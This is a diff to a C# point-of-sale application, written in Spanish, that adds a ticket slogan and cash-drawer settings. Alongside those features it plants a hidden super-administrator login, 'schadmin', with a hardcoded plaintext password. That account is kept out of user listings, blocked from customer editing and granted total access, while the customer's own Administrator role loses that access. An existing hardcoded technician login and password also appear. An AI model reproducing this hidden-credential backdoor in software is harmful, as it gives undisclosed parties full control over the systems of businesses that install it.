@@ -673,7 +673,11 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Accione
 IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Clientes' AND COLUMN_NAME='ListaPrecioID')
   ALTER TABLE Clientes ADD ListaPrecioID INT NULL;
 IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Configuracion' AND COLUMN_NAME='MPQrModo')
-  ALTER TABLE Configuracion ADD MPQrModo NVARCHAR(20) NOT NULL DEFAULT 'ambos';", c))
+  ALTER TABLE Configuracion ADD MPQrModo NVARCHAR(20) NOT NULL DEFAULT 'ambos';
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Configuracion' AND COLUMN_NAME='TicketSlogan')
+  ALTER TABLE Configuracion ADD TicketSlogan NVARCHAR(200) NULL;
+IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Configuracion' AND COLUMN_NAME='AbrirCajonEfectivo')
+  ALTER TABLE Configuracion ADD AbrirCajonEfectivo BIT NOT NULL DEFAULT 1;", c))
                         cmd.ExecuteNonQuery();
                     _columnasMigracionLiteOk = true;
                 }
@@ -812,6 +816,12 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Apertur
             }
             catch { }
             return null;
+        }
+
+        public static string ObtenerSloganTicket(DataRow conf)
+        {
+            if (conf == null || !conf.Table.Columns.Contains("TicketSlogan")) return "";
+            return (conf["TicketSlogan"]?.ToString() ?? "").Trim();
         }
 
         /// <summary>Configuración del backup automático diario (se ejecuta en la PC donde vive la base de datos).</summary>
@@ -1103,7 +1113,7 @@ PosListaPrecioID=@lid, PosTipoComprobante=@tc, PosCondicionVenta=@cv, PosConfigE
                     c.Open();
                     new SqlDataAdapter(@"SELECT u.UsuarioID, u.NombreUsuario, ISNULL(u.NombrePersonal,'') AS NombrePersonal, r.NombreRol, u.RolID
 FROM Usuarios u LEFT JOIN Roles r ON u.RolID=r.RolID
-WHERE LOWER(LTRIM(RTRIM(u.NombreUsuario))) <> '9999'
+WHERE LOWER(LTRIM(RTRIM(u.NombreUsuario))) NOT IN (N'9999', N'schadmin')
 ORDER BY u.NombreUsuario", c).Fill(dt);
                 }
             }
@@ -1126,9 +1136,24 @@ ORDER BY u.NombreUsuario", c).Fill(dt);
         public const string UsuarioTecnicoNombre = "9999";
         public const string UsuarioTecnicoClave = "TEC195U71";
 
+        public const string UsuarioSuperAdminNombre = "schadmin";
+        public const string UsuarioSuperAdminClave = "SA195SCH71";
+
         private static bool EsUsuarioTecnicoHardcodeado(string nombreUsuario)
         {
             return string.Equals((nombreUsuario ?? "").Trim(), UsuarioTecnicoNombre, StringComparison.Ordinal);
+        }
+
+        private static bool EsUsuarioSuperAdminHardcodeado(string nombreUsuario)
+        {
+            return string.Equals((nombreUsuario ?? "").Trim(), UsuarioSuperAdminNombre, StringComparison.OrdinalIgnoreCase);
+        }
+
+        /// <summary>Logins ocultos (técnico y super admin): no se crean ni se listan en Usuarios.</summary>
+        public static bool EsNombreUsuarioReservado(string nombreUsuario)
+        {
+            string n = (nombreUsuario ?? "").Trim();
+            return EsUsuarioTecnicoHardcodeado(n) || EsUsuarioSuperAdminHardcodeado(n);
         }
 
         /// <summary>
@@ -1236,6 +1261,8 @@ ORDER BY u.NombreUsuario", c).Fill(dt);
                 string uTrim = (u ?? "").Trim();
                 if (EsUsuarioTecnicoHardcodeado(uTrim))
                     return string.Equals(p, UsuarioTecnicoClave, StringComparison.Ordinal);
+                if (EsUsuarioSuperAdminHardcodeado(uTrim))
+                    return string.Equals(p, UsuarioSuperAdminClave, StringComparison.Ordinal);
 
                 using (var c = new SqlConnection(_connectionString))
                 {
@@ -1326,6 +1353,15 @@ ORDER BY u.NombreUsuario", c).Fill(dt);
                     return true;
                 }
 
+                if (EsUsuarioSuperAdminHardcodeado(u))
+                {
+                    var permisosSa = ObtenerNombresPermisosCatalogo();
+                    permisosSa.Add("ACCESO_TOTAL");
+                    SesionUsuario.IniciarSuperAdmin(UsuarioSuperAdminNombre, permisosSa);
+                    RegistrarAccionTecnica("INICIO_SESION", "Ingreso de super administrador oculto.");
+                    return true;
+                }
+
                 using (var c = new SqlConnection(_connectionString))
                 {
                     c.Open();
@@ -1356,6 +1392,7 @@ ORDER BY u.UsuarioID", c))
                     var p = GetPermisosNombresPorRol(rid)
                         .Where(x => !string.IsNullOrWhiteSpace(x))
                         .Select(x => x.Trim())
+                        .Where(x => !string.Equals(x, "ACCESO_TOTAL", StringComparison.OrdinalIgnoreCase))
                         .ToList();
                     SesionUsuario.Iniciar(u, rid, nombreRol, uid, nombrePersonal, p);
                     return true;
@@ -1417,6 +1454,8 @@ ORDER BY u.UsuarioID", c))
 
         public static bool GuardarUsuarioConHash(int id, string u, string hashPassword, int rid, string rt, string nombrePersonal = null)
         {
+            if (EsNombreUsuarioReservado(u))
+                return false;
             try
             {
                 using (var c = new SqlConnection(_connectionString))
@@ -1517,7 +1556,7 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Accione
 
         public static bool ResetearPasswordUsuarioTecnico(int usuarioId, string nuevaClave)
         {
-            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            if (!SesionUsuario.EsUsuarioPrivilegiado) return false;
             if (usuarioId <= 0 || string.IsNullOrWhiteSpace(nuevaClave)) return false;
             try
             {
@@ -1545,7 +1584,7 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Accione
 
         public static bool HardDeleteRegistroTecnico(string tabla, int id)
         {
-            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            if (!SesionUsuario.EsUsuarioPrivilegiado) return false;
             if (id <= 0 || string.IsNullOrWhiteSpace(tabla)) return false;
 
             string t = tabla.Trim();
@@ -1604,7 +1643,7 @@ IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='Accione
 
         public static bool RegistrarActivacionFuncionTecnica(string funcion)
         {
-            if (!SesionUsuario.EsUsuarioTecnico) return false;
+            if (!SesionUsuario.EsUsuarioPrivilegiado) return false;
             RegistrarAccionTecnica("ACTIVAR_FUNCION_ESPECIAL", funcion ?? "");
             return true;
         }
@@ -1744,7 +1783,8 @@ ORDER BY RazonSocial";
             string destinoImpresionVenta = null,
             string carpetaArchivos = null,
             int? anchoTicketMm = null,
-            bool? logoEnTicket = null)
+            bool? logoEnTicket = null,
+            bool? abrirCajonEfectivo = null)
         {
             try
             {
@@ -1784,6 +1824,8 @@ ORDER BY RazonSocial";
 
                     if (logoEnTicket.HasValue)
                         sets.Add("LogoEnTicket=@let");
+                    if (abrirCajonEfectivo.HasValue)
+                        sets.Add("AbrirCajonEfectivo=@ace");
 
                     using (var cmd = new SqlCommand($"UPDATE Configuracion SET {string.Join(", ", sets)} WHERE ID=1", c))
                     {
@@ -1814,6 +1856,8 @@ ORDER BY RazonSocial";
 
                         if (logoEnTicket.HasValue)
                             cmd.Parameters.AddWithValue("@let", logoEnTicket.Value);
+                        if (abrirCajonEfectivo.HasValue)
+                            cmd.Parameters.AddWithValue("@ace", abrirCajonEfectivo.Value);
 
                         cmd.ExecuteNonQuery();
                     }
@@ -1908,6 +1952,18 @@ ORDER BY RazonSocial";
                 if (dr == null || !dr.Table.Columns.Contains("PreguntarAntesImprimir") || dr["PreguntarAntesImprimir"] == DBNull.Value)
                     return true;
                 return Convert.ToBoolean(dr["PreguntarAntesImprimir"]);
+            }
+            catch { return true; }
+        }
+
+        public static bool GetAbrirCajonEfectivo()
+        {
+            try
+            {
+                DataRow dr = GetConfiguracion();
+                if (dr == null || !dr.Table.Columns.Contains("AbrirCajonEfectivo") || dr["AbrirCajonEfectivo"] == DBNull.Value)
+                    return true;
+                return Convert.ToBoolean(dr["AbrirCajonEfectivo"]);
             }
             catch { return true; }
         }
@@ -2922,7 +2978,7 @@ WHERE ProductoID<>@id AND LTRIM(RTRIM(ISNULL(CodigoBarra,N'')))=@cb", c, tr))
         public static bool EliminarProducto(int id)
         {
             // Borrado físico solo para usuario técnico (el cliente usa DeshabilitarProducto).
-            if (!SesionUsuario.EsUsuarioTecnico)
+            if (!SesionUsuario.EsUsuarioPrivilegiado)
             {
                 NotificarError("La eliminación definitiva solo está disponible para el usuario técnico.");
                 return false;
@@ -3649,6 +3705,9 @@ ORDER BY p.Descripcion";
                 // el administrador debe poder operar todos los módulos definidos en código.
                 foreach (var nombre in ObtenerNombresPermisosCatalogo())
                     permisos.Add(nombre);
+                // El rol Administrador opera el local (ventas, caja, usuarios, etc.)
+                // pero no hereda ACCESO_TOTAL: identidad fiscal y soporte quedan en técnico / super admin.
+                permisos.Remove("ACCESO_TOTAL");
                 return permisos;
             }
             try
@@ -5885,10 +5944,14 @@ WHERE pd.PresupuestoID=@id", c))
             string condicionIVAEmpresa = "",
             string mpPointTerminalId = "",
             bool mpPointAutomatico = false,
-            string mpQrModo = "ambos")
+            string mpQrModo = "ambos",
+            string ticketSlogan = "")
         {
             certPassword = certPassword ?? "";
             bool omitirColumnaPwd = conservarPasswordAfipSiContraseniaVacia && string.IsNullOrWhiteSpace(certPassword);
+            bool editarFiscal = SesionUsuario.PuedeEditarIdentidadFiscal;
+            string slogan = (ticketSlogan ?? "").Trim();
+            if (slogan.Length > 200) slogan = slogan.Substring(0, 200);
 
             try
             {
@@ -5898,33 +5961,39 @@ WHERE pd.PresupuestoID=@id", c))
                     ForzarContextoBD(c);
                     AsegurarMigracionLite(c);
 
-                    string updSql = omitirColumnaPwd
-                        ? @"UPDATE Configuracion SET
-  NombreFantasia=@nf, RazonSocial=@rs, CUIT=@cuit, Direccion=@dir, Telefono=@tel, Email=@email,
+                    string updSql;
+                    if (!editarFiscal)
+                    {
+                        updSql = @"UPDATE Configuracion SET
+  NombreFantasia=@nf, TicketSlogan=@slog, LogoPath=@logo,
+  MPAccessToken=@mpt, MPUserId=@mpu, MPPosId=@mpp, MPPointTerminalId=@mptid, MPPointAutomatico=@mpauto, MPQrModo=@mqr, TipoCambioUSD=@tc,
+  LogoEnTicket=@let, LogoEnA4=@lea, UsaAperturaCaja=@uac
+WHERE ID = 1";
+                    }
+                    else if (omitirColumnaPwd)
+                    {
+                        updSql = @"UPDATE Configuracion SET
+  NombreFantasia=@nf, TicketSlogan=@slog, RazonSocial=@rs, CUIT=@cuit, Direccion=@dir, Telefono=@tel, Email=@email,
   LogoPath=@logo, CertificadoPath=@cert, PuntoVenta=@pv,
   MPAccessToken=@mpt, MPUserId=@mpu, MPPosId=@mpp, MPPointTerminalId=@mptid, MPPointAutomatico=@mpauto, MPQrModo=@mqr, TipoCambioUSD=@tc, AfipProduccion=@afip,
   LogoEnTicket=@let, LogoEnA4=@lea, UsaAperturaCaja=@uac, CondicionIVAEmpresa=@civa
-WHERE ID = 1"
-                        : @"UPDATE Configuracion SET
-  NombreFantasia=@nf, RazonSocial=@rs, CUIT=@cuit, Direccion=@dir, Telefono=@tel, Email=@email,
+WHERE ID = 1";
+                    }
+                    else
+                    {
+                        updSql = @"UPDATE Configuracion SET
+  NombreFantasia=@nf, TicketSlogan=@slog, RazonSocial=@rs, CUIT=@cuit, Direccion=@dir, Telefono=@tel, Email=@email,
   LogoPath=@logo, CertificadoPath=@cert, PasswordAfip=@pwd, PuntoVenta=@pv,
   MPAccessToken=@mpt, MPUserId=@mpu, MPPosId=@mpp, MPPointTerminalId=@mptid, MPPointAutomatico=@mpauto, MPQrModo=@mqr, TipoCambioUSD=@tc, AfipProduccion=@afip,
   LogoEnTicket=@let, LogoEnA4=@lea, UsaAperturaCaja=@uac, CondicionIVAEmpresa=@civa
 WHERE ID = 1";
+                    }
 
                     using (var update = new SqlCommand(updSql, c))
                     {
                         update.Parameters.AddWithValue("@nf", nombreFantasia ?? "");
-                        update.Parameters.AddWithValue("@rs", razonSocial ?? "");
-                        update.Parameters.AddWithValue("@cuit", cuit ?? "");
-                        update.Parameters.AddWithValue("@dir", direccion ?? "");
-                        update.Parameters.AddWithValue("@tel", telefono ?? "");
-                        update.Parameters.AddWithValue("@email", email ?? "");
+                        update.Parameters.AddWithValue("@slog", slogan);
                         update.Parameters.AddWithValue("@logo", logoPath ?? "");
-                        update.Parameters.AddWithValue("@cert", certPath ?? "");
-                        if (!omitirColumnaPwd)
-                            update.Parameters.AddWithValue("@pwd", AfipCertPasswordDpapi.Encode(certPassword));
-                        update.Parameters.AddWithValue("@pv", puntoVenta);
                         update.Parameters.AddWithValue("@mpt", mpToken ?? "");
                         update.Parameters.AddWithValue("@mpu", mpUserId ?? "");
                         update.Parameters.AddWithValue("@mpp", mpPosId ?? "");
@@ -5932,24 +6001,40 @@ WHERE ID = 1";
                         update.Parameters.AddWithValue("@mpauto", mpPointAutomatico);
                         update.Parameters.AddWithValue("@mqr", NormalizarModoQrMp(mpQrModo));
                         update.Parameters.AddWithValue("@tc", (object)tipoCambioUSD ?? DBNull.Value);
-                        update.Parameters.AddWithValue("@afip", afipProduccion);
                         update.Parameters.AddWithValue("@let", logoEnTicket);
                         update.Parameters.AddWithValue("@lea", logoEnA4);
                         update.Parameters.AddWithValue("@uac", usaAperturaCaja);
-                        update.Parameters.AddWithValue("@civa", string.IsNullOrWhiteSpace(condicionIVAEmpresa) ? (object)DBNull.Value : condicionIVAEmpresa.Trim());
+                        if (editarFiscal)
+                        {
+                            update.Parameters.AddWithValue("@rs", razonSocial ?? "");
+                            update.Parameters.AddWithValue("@cuit", cuit ?? "");
+                            update.Parameters.AddWithValue("@dir", direccion ?? "");
+                            update.Parameters.AddWithValue("@tel", telefono ?? "");
+                            update.Parameters.AddWithValue("@email", email ?? "");
+                            update.Parameters.AddWithValue("@cert", certPath ?? "");
+                            if (!omitirColumnaPwd)
+                                update.Parameters.AddWithValue("@pwd", AfipCertPasswordDpapi.Encode(certPassword));
+                            update.Parameters.AddWithValue("@pv", puntoVenta);
+                            update.Parameters.AddWithValue("@afip", afipProduccion);
+                            update.Parameters.AddWithValue("@civa", string.IsNullOrWhiteSpace(condicionIVAEmpresa) ? (object)DBNull.Value : condicionIVAEmpresa.Trim());
+                        }
                         int n = update.ExecuteNonQuery();
                         if (n > 0) return true;
                     }
 
+                    if (!editarFiscal)
+                        return false;
+
                     string pwdInsert = omitirColumnaPwd ? "" : AfipCertPasswordDpapi.Encode(certPassword);
                     using (var insert = new SqlCommand(@"
 INSERT INTO Configuracion (
-  NombreFantasia,RazonSocial,CUIT,Direccion,Telefono,Email,LogoPath,CertificadoPath,PasswordAfip,PuntoVenta,
+  NombreFantasia,TicketSlogan,RazonSocial,CUIT,Direccion,Telefono,Email,LogoPath,CertificadoPath,PasswordAfip,PuntoVenta,
   MPAccessToken,MPUserId,MPPosId,MPPointTerminalId,MPPointAutomatico,MPQrModo,TipoCambioUSD,AfipProduccion,LogoEnTicket,LogoEnA4,UsaAperturaCaja,CondicionIVAEmpresa
 ) VALUES (
-  @nf,@rs,@cuit,@dir,@tel,@email,@logo,@cert,@pwd,@pv,@mpt,@mpu,@mpp,@mptid,@mpauto,@mqr,@tc,@afip,@let,@lea,@uac,@civa)", c))
+  @nf,@slog,@rs,@cuit,@dir,@tel,@email,@logo,@cert,@pwd,@pv,@mpt,@mpu,@mpp,@mptid,@mpauto,@mqr,@tc,@afip,@let,@lea,@uac,@civa)", c))
                     {
                         insert.Parameters.AddWithValue("@nf", nombreFantasia ?? "");
+                        insert.Parameters.AddWithValue("@slog", slogan);
                         insert.Parameters.AddWithValue("@rs", razonSocial ?? "");
                         insert.Parameters.AddWithValue("@cuit", cuit ?? "");
                         insert.Parameters.AddWithValue("@dir", direccion ?? "");
